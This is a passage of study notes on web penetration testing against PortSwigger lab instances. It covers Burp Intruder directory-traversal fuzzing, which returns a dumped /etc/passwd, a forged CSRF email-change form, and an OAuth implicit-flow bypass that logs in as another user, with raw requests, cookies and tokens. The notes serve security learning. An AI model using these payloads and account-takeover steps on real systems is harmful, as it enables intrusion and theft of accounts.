what to test in the input 

ii) Next we will select 7.jpg and add $ sign 

eg:
GET /image?filename=7.jpg HTTP/2
to 

GET /image?filename=§7.jpg§ HTTP/2

iii) Next we need to tell Burp, what to test it for 
-> We need to put after the equal sign 
--> This can be done in Payloads tab 

Our Goal is to send all requests in the cheatsheet 
as inputs after the filename here:
GET /image?filename=§7.jpg§ HTTP/2

iv) In Payloads tab -> Payloads Settings(simple list) 
-> We can select load option and select the file : directory-traversal-cheatsheet.txt which loads all the text 
to the Payloads Settings(simple list)

v) now we can see that , Payload sets, it shows Payload count as 181 
vi) Now we can press "Start Attack" 

k) Once we do "Start Attack" we can see that we can get the response in this format:

Request  Payload 			status  	Error timeout     length
1        /etc/master.passwd  400                           136
1        /master.passwd      400                           128


-> Here based on the status we can identify if we get positive response or not by using the status
-> if 200 it is positive response status
-> We also can sort based on status here 

l) In our requests we can see two payloads that have 200 status and on clicking the payload we can see the actual request

eg:
Request:
GET /image?filename=%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd HTTP/2
Host: 0a88007d04df05ef80fa1c4600f60085.web-security-academy.net
Cookie: session=PJ0vQgZzXdZiEZRbGTtRfQ30DuxemSrO
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a88007d04df05ef80fa1c4600f60085.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


Response:
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false


m) Thus to use Intruder, we will to spot a weak parameter link manually, and then use 
Intruder to do repetitive tasks 

-> Thus we are using human intelligence to spot weak spot and we use machine to boring task of 
repetitively send large number of payloads until one of them gives a positive response 

n) We can also use Intruders to 
i) Bruteforce passwords  
-> since we can modify requests anyway you want 

o) In case we use pro version of Burp suite, we dont even need to use the cheat sheet 
-> Instead we can load a preloaded payload list 
eg: fuzzing path reversal -> loads the large number of payloads 


24) BAC: CSRF Cross Site Request forgery:6 
a) CSRF - Cross site request forgery
b) This falls under Broken access control because application does not properly validate the submitted requests 
-> As a result, requests can be forged and sent to 
users to make them take actions they dont 
intend to do such as:

*Change email
*Change password
*Submit a payment 
etc

c) To test the same:

i) Create two accounts on target website: 

JAMES BOND 
james@bing.com
France 

JOHN Wick
jhn@gmail.com
Ireland

b) Login in one of the accounts and make a list of 
all the different requests that we can submit 
as this logged in User(james@bing.com) 

-> See if you can forge them 

c) Login to another user and submit the 
forged requests and see if they get accepted by we application 

Target website: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

d) Login to first account: wiener:peter
-> Whose email id is: wiener@normal-user.net 
--> From admin page, we can update email to test@test.com 

e) Next step is to see if we can forge this request 
and then login  as another user : carlos:montoya
-> submit that forged request and see if the 
web application accepts it 

f) If it does then it means that the web 
application is not verifying the users that 
are submitting the requests because we are creating the request as 
wiener and submitting it as carlos , but the 
application is still accepting it and still applying our 
changes 

eg:
If we are able to get carlos to change their 
email to an email that we control eg: test@test.com 
-> then i can go ahead and use the password 
recovery functionality in the website and recover 
the password in order to gain full control 
over their account 

-> Hence impact of these vulnerabilities is very high 

g) Before we create forged requests, lets simply clone this form 
and copy its functionality in a simple html file 
-> To do that inspect the page and go to the form element and do copy element in 
elements tab of inspect page 

h) Then we will go to empty text file and copy the element code 
-> goto : https://0a4d00af04467e8c80e412a600e000de.web-security-academy.net/my-account 

eg:
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
			<label>Email</label>
			<input required="" type="email" name="email" value="">
				<input required="" type="hidden" name="csrf" value="LaQ2mNddCC1HVNCzsewUsHS6iXvMeLv1">
					<button class="button" type="submit"> Update email </button>
				</form>
						
-> Store the element in file and save it as 
csrf.html 
-> Here this parameter: action="/my-account/change-email", tells the endpoint 
or the path that the data your input in the 
form is going to go 

i) Now change the action by copying the full link:

eg:
<form class="login-form" name="change-email-form" action="https://0a4d00af04467e8c80e412a600e000de.web-security-academy.net/my-account/change-email" method="POST">
					<label>Email</label>
					<input required="" type="email" name="email" value="">
						<input required="" type="hidden" name="csrf" value="LaQ2mNddCC1HVNCzsewUsHS6iXvMeLv1">
							<button class="button" type="submit"> Update email </button>
						</form>

-> Now upon opening the html, we will see a basic form and again on inspecting we will be able to 
see that action is like this:

<form class="login-form" name="change-email-form" action="https://0a4d00af04467e8c80e412a600e000de.web-security-academy.net/my-account/change-email" method="POST">
							<label>Email</label>
							<input required="" type="email" name="email" value="">
								<input required="" type="hidden" name="csrf" value="LaQ2mNddCC1HVNCzsewUsHS6iXvMeLv1">
									<button class="button" type="submit"> Update email </button>
								</form>
-> this page which we got after saving this html is forged website 


-> What we are trying to do is to discover a client side request forgery vulnerability.
---> here we logged in as one user, created a forge request
-> To test if this request will be accepted by the 
web application, we need to logout from this user(james), login as 
another user(john) - submit the form and see if the web application 
is going to accept this request that we created 
as James 
-> If it does, then this target is vulnerable for a client 
side request forgery 


j) If we logout now from wiener account and go to 
carlos account we wil see mail as carlos@moyo.com
-> Now if we go to forged website and enter the email, we will see the updated email 
in the account page of carlos page

k) We may argue that target user will never submit 
request to update email like we did our forged site 
-> That's correct 
-> But there are ways to have this form in 
html page that will automatically submit the request 
when the target user clicks on the link 
---> THis goes more into website hacking 
and that will be covered as part of website 
hacking course 

l) Another thing to look is to look into hidden attribute of 
input element 

               <input required="" type="hidden" name="csrf" value="LaQ2mNddCC1HVNCzsewUsHS6iXvMeLv1">
-> Here the value is the csrf token 
-> We always want new token, so to get it refresh 
the target page, get the new token and paste it in here and test it from a different 
user
-> IF that does not work, remove the hidden element and 
see if it works, because most websites work without csrf token  


25) BAC:6 OAUTH2.0 Vulnerabilities
a) OAUTH is generally used to allow users to 
login to websites without having to signup with this 
website and without having to fill any forms on it 


###HOW it wORKs####
a) Target user wants to login to target website 
b) Target website will have a social login 
button which could be a facebook or google or twitter account 
c) Once the user clicks on the social login button, target website is 
going to to display a popup for the social network eg: google or facebook or twitter 
-> where we get a popup window to login to google 
-> This popup window will be displayed to the user 
d) User logs in with his social media account eg: google or facebook or twitter 
-> If correct information is enter, social website will return 
a access token to the website that they 
want to login 
e) Then the target website will communicate with social website using the Access token , retrieve the user data 
and use it on this website to set  up an account or to login the user to this website 
f) As a result of using oauth, user does not have to 
fill any forms , neednot manually sign up to this 
target website - All the data needed is being 
pulled from the social website that the user 
has already have account and has been authenticated alreay to use the 
access token
#####################

b) OAUTH vulnerability is a very serious vulnerability
- because when discovered it could allow any user  to login as another user or 
as an administrator which would compromise the whole website 

26) BAC:6 OAUTH2.0 Vulnerabilities - OAUTH2.0 basic exploitation

Target site: https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow

a) This falls under broken access control vulnerabilities
-> And therefore the best way to discover it 
is to have two accounts and see if you can access 
information that belongs to the second 
account from the second account 
-> Or if you can login as the second account 
using information or the token of the first 
account 



b) We have two users 

User 1: wiener/peter 

-> The goal is try logging into another account 
on the target website that has the email of 
carlos at carlos@carlos-montoya.net 
-> lets open the lab and go to my account and 
test the functionality as usual without 
exploiting anything 
-> Lets go to my account and enter sign in information
Lets assume that this is a social login flow and we are 
assuming that this is using a third party login prompt from 
google, facebook, twitter and so on.
-> It is asking you to enter your user name/password 


c) Here the user name/password is wiener/peter
-> Before accessing the information - this social blog is asking a prompt saying 
" WeLikeToBlog" is requesting access to Profile/Email from the original website 
-> Also it is asking you to confirm on the same 
-> We will click on continue to confirm and now the 
blog has my profile information and my email 
-> And we should be logged in 




d) On clicking my account, now we wont be prompted to 
enter username/password and instead we will be displayed with the following message:

" Your username is: wiener 
  Your email is: wiener@hotdog.com " 
  
-> THe point to note is : we never gave any email to this 
website, but this website is able to know my email because the 
third party social login eg: google, has sent that information 
back to it because we authenticated with google 
using the social login button. 


e) So as usual in a normal pen test or in 
normal bug hunt : Once we test the normal 
functionality and we see that it works and 
we have a good understanding on how it is supposed 
work , 
-> the next goal is to analyze 
what happens when we use this functionality 
with burp proxy and see if we can exploit it 
and discover bugs within it 

f) Lets logout and now we are not intercepting the requests , because 
We wanted to see the whole flow 
-> We wanted to see what happened from the point that i clicked on "login" 

g) To do that, we will be using HTTP history tool of 
burpsuite 

h) HTTP  History tab under Proxy, shows all 
of the requests that were sent or proxied through 
burp 
-> So right now we have all the requests that were previously 
sent as we are just testing the website normally

i) I will highlight everything and delete it since i wanted to 
see everything from the point that i used: social login 
functionality 
->We delete it because we wanted to see everything from the point we did social login 

j) If i logout and go to myaccount, it will be logged in automatically and we will be 
able to see the full authentication flow  using Social login in HTTP history 
-> Here in http history we can see all the 
requests and responses exchanged between 
current website and third party website 


HTTP History after social  login: 

                    host 										        method  url 
74	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/my-account	false	false	302	93					true	34.246.129.62		1708989340749	8080
75	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/social-login	false	false	200	3120	HTML		Authentication bypass via OAuth implicit flow		true	34.246.129.62		1708989341597	8080
76	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/academyLabHeader	false	false	101	147					true	34.246.129.62		1708989342179	8080
77	https://oauth-0a90007504a36cfc827178f102b500a3.oauth-server.net	GET	/auth?client_id=vdkfekusm8ab2awgjkswx&redirect_uri=https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/oauth-callback&response_type=token&nonce=-495378282&scope=openid%20profile%20email	true	false	302	1130	HTML				true	34.246.129.62	_session=vEKtkLvYkAjnJ9TMuAOhg; _session.legacy=vEKtkLvYkAjnJ9TMuAOhg	1708989344847	8080
78	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/oauth-callback	false	false	200	833	HTML				true	34.246.129.62		1708989345667	8080
79	https://oauth-0a90007504a36cfc827178f102b500a3.oauth-server.net	GET	/me	false	false	200	467	JSON				true	34.246.129.62		1708989345867	8080
80	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	POST	/authenticate	true	false	302	168					true	34.246.129.62	session=qAM3rSsFV2cljd5tzwxYuLSgFY0sIMMc	1708989346043	8080
81	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/	false	false	200	8534	HTML		Authentication bypass via OAuth implicit flow		true	34.246.129.62		1708989346255	8080
82	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/	false	false	200	8534	HTML		Authentication bypass via OAuth implicit flow		true	34.246.129.62		1708989346445	8080
83	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/academyLabHeader	false	false	101	147					true	34.246.129.62		1708989346995	8080



k) Decoding HTTP History

a) Host - URL which we are trying to reach 
b) method - http method we use to send the request 
c) url - endpoint for which the request was sent 
d) status - response code that was sent as a result of this request 


l) Flow using above HTTP History 
i) First we can see a request to /my-account 


eg:
74	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/my-account	false	false	302	93					true	34.246.129.62		1708989340749	8080


Request:
GET /my-account HTTP/2
Host: 0af500e7049e6cd482b47a44008f00b3.web-security-academy.net
Cookie: session=yFFFGx69kbDbYdRaaYfpyEDsAEJvysLf
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i




Response:
HTTP/2 302 Found
Location: /social-login
X-Frame-Options: SAMEORIGIN
Content-Length: 0

ii) Then Another request was sent to an endpoint:/social-login 

75	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/social-login	false	false	200	3120	HTML		Authentication bypass via OAuth implicit flow		true	34.246.129.62		1708989341597	8080

Request:
GET /social-login HTTP/2
Host: 0af500e7049e6cd482b47a44008f00b3.web-security-academy.net
Cookie: session=yFFFGx69kbDbYdRaaYfpyEDsAEJvysLf
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i




Response: 
HTML page is rendered , which shows we are redirecting to social media 


iii) Next request was to /academyLabHeader 


76	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	GET	/academyLabHeader	false	false	101	147					true	34.246.129.62		1708989342179	8080


iv) Next step is  important as we can /auth in end point 


77	https://oauth-0a90007504a36cfc827178f102b500a3.oauth-server.net	GET	/auth?client_id=vdkfekusm8ab2awgjkswx&redirect_uri=https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/oauth-callback&response_type=token&nonce=-495378282&scope=openid%20profile%20email	true	false	302	1130	HTML				true	34.246.129.62	_session=vEKtkLvYkAjnJ9TMuAOhg; _session.legacy=vEKtkLvYkAjnJ9TMuAOhg	1708989344847	8080


-> We can see a client id being sent . redirect_uri , also we can request specifying a response type of token - meaning that it is asking for a token 
-> Token is sent from third party website or social login to the website that we are trying to authenticate with 
-> Thus is conclusion - request is giving a client id and requesting a token 


Request:
GET /auth?client_id=vdkfekusm8ab2awgjkswx&redirect_uri=https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/oauth-callback&response_type=token&nonce=-495378282&scope=openid%20profile%20email HTTP/2
Host: oauth-0a90007504a36cfc827178f102b500a3.oauth-server.net
Cookie: _session=vEKtkLvYkAjnJ9TMuAOhg; _session.legacy=vEKtkLvYkAjnJ9TMuAOhg
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

----> In Response we can see that we get status code 302 and we get access_token in the response 
access_token=_au_Q9R6whqb56As8QryeCoRM-gqcPHx8KgJqbGSWp1
-> Application is going to use this access_token to authenticate the application 


Response:
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/oauth-callback#access_token=_au_Q9R6whqb56As8QryeCoRM-gqcPHx8KgJqbGSWp1&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=vEKtkLvYkAjnJ9TMuAOhg; path=/; expires=Mon, 11 Mar 2024 23:15:46 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=vEKtkLvYkAjnJ9TMuAOhg; path=/; expires=Mon, 11 Mar 2024 23:15:46 GMT; secure; httponly
Date: Mon, 26 Feb 2024 23:15:46 GMT
Keep-Alive: timeout=5
Content-Length: 459

Redirecting to <a href="https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/oauth-callback#access_token=_au_Q9R6whqb56As8QryeCoRM-gqcPHx8KgJqbGSWp1&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/oauth-callback#access_token=_au_Q9R6whqb56As8QryeCoRM-gqcPHx8KgJqbGSWp1&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</a>.


v) Next we can see another request sent to /authenticate endpoint 


80	https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net	POST	/authenticate	true	false	302	168					true	34.246.129.62	session=qAM3rSsFV2cljd5tzwxYuLSgFY0sIMMc	1708989346043	8080

-> You will notice that the request is sent with the email,username and token which we received earlier
-> This request will authenticate us to login 


Request:
POST /authenticate HTTP/2
Host: 0af500e7049e6cd482b47a44008f00b3.web-security-academy.net
Cookie: session=yFFFGx69kbDbYdRaaYfpyEDsAEJvysLf
Content-Length: 103
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Accept: application/json
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af500e7049e6cd482b47a44008f00b3.web-security-academy.net/oauth-callback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

{"email":"wiener@hotdog.com","username":"wiener","token":"_au_Q9R6whqb56As8QryeCoRM-gqcPHx8KgJqbGSWp1"}



Response:
HTTP/2 302 Found
Location: /
Set-Cookie: session=qAM3rSsFV2cljd5tzwxYuLSgFY0sIMMc; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0

vi) THus all we analyzed until now is a typical authentication flow, now we can send the request in repeater and change the email id 
and see what we can get in the response:


eg:carlos@carlos-montoya.net


-> But since we use Repeater, we wont be able to see it in UI

Vii) We can see it in UI , by right-clicking Repeater -> Request in Browser -> Original session 
And then we will get a burpsuite url which we need to launch in browser will give that page 


viii) Now in UI we will be able to see details of Carlos

-> Thus by using OAUTH flow, we can access  completely different account  which does not belong to me 



27) BAC:6 OAUTH2.0 Vulnerabilities - Exploiting a Linking OAUTH 2.0 Flow Through CSRF
-> This is slight more advanced exploitation of OAUTH flow 

a) This is slightly more advanced because we need to 
social engineer a user to exploit it properly 
-> So basically exploiting CSRF vulnerability 
through the initial OAUTH vulnerability
-> Thus OAUTH vulnerability results into a CSRF vulnerability 

######QUICK RECAP CSRF########
1) Requests not validated at server side 
2) Server does not check if user generated the request 
3) Requests can be forged and sent to users to 
make them do things they dont intend to do such as 
changing their password 
######QUICK RECAP CSRF########

Target website: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

Blog website account: wiener:peter
Social media profile: peter.wiener:hotdog

b) Use the above details and do a social login 


c) Now lets do an analysis of social login flow



All Requests:
400	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/auth?client_id=a1hzszw8ah71aw75c15zn&redirect_uri=https://0a420000042409a7856f1c3d009700f8.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email	true	false	302	681	HTML				true	79.125.84.16	_interaction=tCE7b8cM10JUhHU5UOG0M; _interaction_resume=tCE7b8cM10JUhHU5UOG0M	1708995156567	8080
401	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/interaction/tCE7b8cM10JUhHU5UOG0M	false	false	200	4630	HTML		Sign-in		true	79.125.84.16		1708995157937	8080
404	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/resources/labheader/images/logoAcademy.svg	false	false	200	8823	XML	svg			true	79.125.84.16		1708995158275	8080
405	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	POST	/interaction/tCE7b8cM10JUhHU5UOG0M/login	true	false	302	277					true	79.125.84.16		1708995237912	8080
406	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/auth/tCE7b8cM10JUhHU5UOG0M	false	false	302	921	HTML				true	79.125.84.16	_interaction=tCE7b8cM10JUhHU5UOG0M; _interaction_resume=tCE7b8cM10JUhHU5UOG0M; _session=oltyGiUqxiyg6MaifDfY8; _session.legacy=oltyGiUqxiyg6MaifDfY8	1708995239205	8080
407	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/interaction/tCE7b8cM10JUhHU5UOG0M	false	false	200	4809	HTML		Sign-in		true	79.125.84.16		1708995239449	8080
409	https://0a420000042409a7856f1c3d009700f8.web-security-academy.net	GET	/resources/images/blog.svg	false	false	200	7499	XML	svg			true	79.125.84.16		1708995240042	8080
410	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	POST	/interaction/tCE7b8cM10JUhHU5UOG0M/confirm	false	false	302	277					true	79.125.84.16		1708995318838	8080
411	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/auth/tCE7b8cM10JUhHU5UOG0M	false	false	302	1023	HTML				true	79.125.84.16	_interaction_resume=; _session=RyAFaES85v_EPtrY6caVp; _session.legacy=RyAFaES85v_EPtrY6caVp	1708995319932	8080
412	https://0a420000042409a7856f1c3d009700f8.web-security-academy.net	GET	/oauth-linking?code=zL7NEBImWoxoIm-S-_5bKRd8OlTPQtB4ETd-JbZm4PO	true	false	200	3000	HTML		Forced OAuth profile linking		true	79.125.84.16		1708995320181	8080
415	https://0a420000042409a7856f1c3d009700f8.web-security-academy.net	GET	/resources/labheader/js/labHeader.js	false	false	200	1673	script	js			true	79.125.84.16		1708995321386	8080
416	https://0a420000042409a7856f1c3d009700f8.web-security-academy.net	GET	/resources/labheader/images/logoAcademy.svg	false	false	200	8852	XML	svg			true	79.125.84.16		1708995321572	8080
417	https://0a420000042409a7856f1c3d009700f8.web-security-academy.net	GET	/resources/labheader/images/ps-lab-notsolved.svg	false	false	200	942	XML	svg			true	79.125.84.16		1708995321572	8080
418	https://0a420000042409a7856f1c3d009700f8.web-security-academy.net	GET	/academyLabHeader	false	false	101	147					true	79.125.84.16		1708995321917	8080
419	https://0a420000042409a7856f1c3d009700f8.web-security-academy.net	GET	/my-account	false	false	200	3636	HTML		Forced OAuth profile linking		true	79.125.84.16		1708995661841	8080
420	https://0a420000042409a7856f1c3d009700f8.web-security-academy.net	GET	/academyLabHeader	false	false	101	147					true	79.125.84.16		1708995663881	8080


i)  Here the first request 

400	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/auth?client_id=a1hzszw8ah71aw75c15zn&redirect_uri=https://0a420000042409a7856f1c3d009700f8.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email	true	false	302	681	HTML				true	79.125.84.16	_interaction=tCE7b8cM10JUhHU5UOG0M; _interaction_resume=tCE7b8cM10JUhHU5UOG0M	1708995156567	8080


Request:
GET /auth?client_id=a1hzszw8ah71aw75c15zn&redirect_uri=https://0a420000042409a7856f1c3d009700f8.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a420000042409a7856f1c3d009700f8.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i




Response:
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Set-Cookie: _interaction=tCE7b8cM10JUhHU5UOG0M; path=/interaction/tCE7b8cM10JUhHU5UOG0M; expires=Tue, 27 Feb 2024 01:02:38 GMT; samesite=lax; secure; httponly
Set-Cookie: _interaction_resume=tCE7b8cM10JUhHU5UOG0M; path=/auth/tCE7b8cM10JUhHU5UOG0M; expires=Tue, 27 Feb 2024 01:02:38 GMT; samesite=lax; secure; httponly
Location: /interaction/tCE7b8cM10JUhHU5UOG0M
Content-Type: text/html; charset=utf-8
Date: Tue, 27 Feb 2024 00:52:38 GMT
Keep-Alive: timeout=5
Content-Length: 99

Redirecting to <a href="/interaction/tCE7b8cM10JUhHU5UOG0M">/interaction/tCE7b8cM10JUhHU5UOG0M</a>.


-> In the request we can see client id sent with a link 

ii) After that we see some interaction requests which were not that useful 
iii) Then we can see an /auth request :

406	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/auth/tCE7b8cM10JUhHU5UOG0M	false	false	302	921	HTML				true	79.125.84.16	_interaction=tCE7b8cM10JUhHU5UOG0M; _interaction_resume=tCE7b8cM10JUhHU5UOG0M; _session=oltyGiUqxiyg6MaifDfY8; _session.legacy=oltyGiUqxiyg6MaifDfY8	1708995239205	8080

Request:
GET /auth/tCE7b8cM10JUhHU5UOG0M HTTP/2
Host: oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net
Cookie: _interaction_resume=tCE7b8cM10JUhHU5UOG0M
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
